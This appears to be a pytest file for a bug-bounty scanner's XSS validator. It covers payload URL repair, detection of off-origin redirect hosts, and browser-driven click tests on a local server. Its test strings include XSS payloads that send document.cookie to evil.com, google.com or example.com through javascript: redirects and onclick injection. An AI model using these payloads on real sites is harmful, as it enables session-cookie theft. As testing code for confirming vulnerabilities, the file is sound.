"""
Unit tests for the H1 XSS validator's confirmation logic.

Core invariant (from the project bar: real exploit evidence, never speculation):
XSS is confirmed ONLY on browser-observed execution — a dialog firing, an
off-origin redirect to a host embedded in the payload, or a live reflected
alert. The LLM reading the response source can never flip the verdict to
confirmed, because it only sees static markup and would be guessing.

The full _validate_xss drives Playwright, so we unit-test the pure decision
helper (_payload_exfil_hosts) that classifies which observed navigations count
as proof, plus the verdict-parser threshold. An integration test drives the
browser separately.
"""

from __future__ import annotations

import http.server
import socketserver
import threading
import urllib.parse

import pytest

from dast.hackerone.validator import (
    _payload_exfil_hosts,
    _parse_llm_verdict,
    _repair_proof_url,
    _trigger_interaction_xss,
)


# ── deterministic proof-URL repair ────────────────────────────────────────────

class TestRepairProofUrl:
    def test_bare_plus_in_js_payload_becomes_percent_2b(self):
        # A bare '+' in a query string decodes to a space and breaks the JS
        # concatenation; it must be re-encoded as %2b inside the js payload.
        url = "http://t.com/?url=javascript:top['loca'+'tion']='https://evil.com'+document.cookie"
        out = _repair_proof_url(url)
        assert "'loca'%2b'tion'" in out
        assert "'%2bdocument.cookie" in out or "'+document.cookie" not in out

    def test_plus_outside_js_payload_untouched(self):
        # A '+' in an ordinary param is not part of a js payload — leave it.
        url = "http://t.com/search?q=a+b&x=1"
        assert _repair_proof_url(url) == url

    def test_next_param_after_js_payload_preserved(self):
        url = "http://t.com/?url=javascript:x='a'+'b'&filename=y"
        out = _repair_proof_url(url)
        assert "&filename=y" in out
        assert "'a'%2b'b'" in out

    def test_html_entity_ampersand_decoded(self):
        url = "http://t.com/?a=1&amp;b=2"
        assert _repair_proof_url(url) == "http://t.com/?a=1&b=2"

    def test_already_encoded_url_unchanged(self):
        url = "http://t.com/?url=javascript:x='a'%2b'b'"
        assert _repair_proof_url(url) == url

    def test_empty_url(self):
        assert _repair_proof_url("") == ""


def _exfil_match(navigated_hosts, exfil_hosts):
    """Mirror of the domain-family match used in _validate_xss._executed_yet."""
    for observed in navigated_hosts:
        for target in exfil_hosts:
            if (
                observed == target
                or observed.endswith("." + target)
                or target.endswith("." + observed)
            ):
                return observed
    return ""


# ── redirect-exfil host extraction (the redirect-XSS proof signal) ────────────

class TestPayloadExfilHosts:
    def test_extracts_attacker_host_from_redirect_payload(self):
        # The exact class of payload from the reported false positive: a
        # javascript: redirect that sends the browser to an attacker host.
        payload = "javascript:top['location']='https://evil.com?'+document.cookie"
        hosts = _payload_exfil_hosts(payload, "https://app.example.com/page")
        assert "evil.com" in hosts

    def test_google_redirect_payload(self):
        # The reported payload redirected to google.com — still off-origin, so
        # navigating there IS observed proof the injected redirect executed.
        payload = "javascript:top.location='https://google.com?'+top.document.cookie"
        hosts = _payload_exfil_hosts(payload, "https://partnersapply.example.com/x")
        assert "google.com" in hosts

    def test_excludes_target_own_origin(self):
        # Navigating within the app's own host is not proof of exfiltration.
        payload = "https://app.example.com/redirect?next=/home"
        hosts = _payload_exfil_hosts(payload, "https://app.example.com/page")
        assert "app.example.com" not in hosts

    def test_excludes_target_subdomain_relative(self):
        payload = "https://cdn.app.example.com/asset.js"
        hosts = _payload_exfil_hosts(payload, "https://example.com/page")
        # Subdomain of target is treated as same-origin family, not exfil proof.
        assert "cdn.app.example.com" not in hosts

    def test_ignores_common_cdn_analytics_hosts(self):
        payload = "https://www.google-analytics.com/collect"
        hosts = _payload_exfil_hosts(payload, "https://app.example.com/page")
        assert hosts == set()

    def test_no_hosts_for_alert_only_payload(self):
        # A classic alert() payload has no embedded host — proof comes from the
        # dialog hook, not from navigation.
        payload = "<script>alert(1)</script>"
        hosts = _payload_exfil_hosts(payload, "https://app.example.com/page")
        assert hosts == set()

    def test_handles_url_encoded_payload(self):
        payload = "javascript:location%3D%27https%3A%2F%2Fevil.com%27"
        hosts = _payload_exfil_hosts(payload, "https://app.example.com/page")
        assert "evil.com" in hosts


# ── exfil navigation match (domain family, handles www/redirects) ─────────────

class TestExfilNavigationMatch:
    def test_exact_host_match(self):
        assert _exfil_match(["evil.com"], {"evil.com"}) == "evil.com"

    def test_www_redirect_matches_payload_host(self):
        # Payload targets google.com; the browser lands on www.google.com after
        # google's own redirect — this must still count as observed execution.
        assert _exfil_match(["127.0.0.1:9914", "www.google.com"], {"google.com"}) == "www.google.com"

    def test_payload_subdomain_matches_observed_apex(self):
        assert _exfil_match(["evil.com"], {"attacker.evil.com"}) == "evil.com"

    def test_no_match_when_only_target_origin_navigated(self):
        # The false-positive scenario: only the target host was navigated — no
        # exfil host reached, so no confirmation.
        assert _exfil_match(["partnersapply.example.com"], {"google.com"}) == ""

    def test_unrelated_host_does_not_match(self):
        assert _exfil_match(["cdn.example.org"], {"evil.com"}) == ""


# ── LLM verdict threshold (advisory only for XSS) ─────────────────────────────

class TestParseLlmVerdict:
    def test_high_confidence_confirmed_parses_true(self):
        text = "Verdict: Confirmed\nConfidence: 98%\nReasoning: payload executed"
        confirmed, label = _parse_llm_verdict(text)
        assert confirmed is True
        assert "98%" in label

    def test_below_threshold_not_confirmed(self):
        text = "Verdict: Confirmed\nConfidence: 80%\nReasoning: looks likely"
        confirmed, _ = _parse_llm_verdict(text)
        assert confirmed is False

    def test_needs_manual_verdict_not_confirmed(self):
        text = "Verdict: Needs manual review\nConfidence: 99%\nReasoning: cannot be sure"
        confirmed, _ = _parse_llm_verdict(text)
        assert confirmed is False


# ── interaction-trigger click gating (browser integration) ────────────────────
# These drive real chromium. They skip cleanly if the browser is not installed
# so the default suite stays green on machines without `playwright install`.

def _chromium_available() -> bool:
    try:
        from playwright.sync_api import sync_playwright
        with sync_playwright() as p:
            b = p.chromium.launch(headless=True)
            b.close()
        return True
    except Exception:
        return False


_CHROMIUM = _chromium_available()
_needs_chromium = pytest.mark.skipif(not _CHROMIUM, reason="chromium not installed")


class _LocalServer:
    """Serves a fixed HTML body on 127.0.0.1 for the duration of a test."""

    def __init__(self, html: bytes):
        self._html = html
        handler_html = html

        class _H(http.server.BaseHTTPRequestHandler):
            def do_GET(self):  # noqa: N802
                self.send_response(200)
                self.send_header("Content-Type", "text/html")
                self.end_headers()
                self.wfile.write(handler_html)

            def log_message(self, *a):  # silence
                pass

        self._srv = socketserver.TCPServer(("127.0.0.1", 0), _H)
        self.port = self._srv.server_address[1]
        self._thread = threading.Thread(target=self._srv.serve_forever, daemon=True)

    def __enter__(self):
        self._thread.start()
        return self

    def __exit__(self, *exc):
        self._srv.shutdown()
        self._srv.server_close()


async def _observed_navigations(html: bytes, url_query: str, payload: str, exfil_hosts):
    from urllib.parse import urlparse
    from playwright.async_api import async_playwright

    with _LocalServer(html) as server:
        proof = f"http://127.0.0.1:{server.port}/?{url_query}"
        async with async_playwright() as pw:
            browser = await pw.chromium.launch(headless=True)
            page = await browser.new_page()
            navs = []
            page.on(
                "framenavigated",
                lambda f: navs.append(urlparse(f.url).netloc) if f == page.main_frame else None,
            )
            await page.goto(proof, wait_until="commit", timeout=8000)
            await page.wait_for_timeout(700)
            await _trigger_interaction_xss(page, payload, exfil_hosts)
            await page.wait_for_timeout(700)
            await browser.close()
            return navs


@_needs_chromium
async def test_click_triggers_javascript_href_redirect():
    # href=javascript:top.location=example.com -> requires a click to fire.
    payload = "javascript:top['loca'+'tion']='https://example.com/?c='+top['docu'+'ment']['cookie']"
    q = "url=" + urllib.parse.quote(payload, safe="")
    html = (
        b"<html><body><a id='dl'>Download</a>"
        b"<script>document.getElementById('dl').href = "
        b"new URLSearchParams(location.search).get('url');</script></body></html>"
    )
    navs = await _observed_navigations(html, q, payload, {"example.com"})
    assert "example.com" in navs


@_needs_chromium
async def test_does_not_click_native_control_without_payload():
    # A native app button carrying its own onclick — NOT our injection. It must
    # not be clicked (clicking it would navigate to app-action.example).
    payload = "<script>alert(1)</script>"  # unrelated reflected payload
    html = (
        b"<html><body>"
        b"<button onclick=\"location='https://app-action.example/delete'\">Delete account</button>"
        b"</body></html>"
    )
    navs = await _observed_navigations(html, "q=1", payload, set())
    assert "app-action.example" not in navs


@_needs_chromium
async def test_clicks_onclick_carrying_our_payload():
    # An element whose onclick reflects our exfil host IS our injection -> click.
    payload = "x';top.location='https://example.com/steal"
    q = "q=" + urllib.parse.quote(payload, safe="")
    html = (
        b"<html><body>"
        b"<div id='t' onclick=\"top.location='https://example.com/steal?c='+document.cookie\">Click</div>"
        b"</body></html>"
    )
    navs = await _observed_navigations(html, q, payload, {"example.com"})
    assert "example.com" in navs
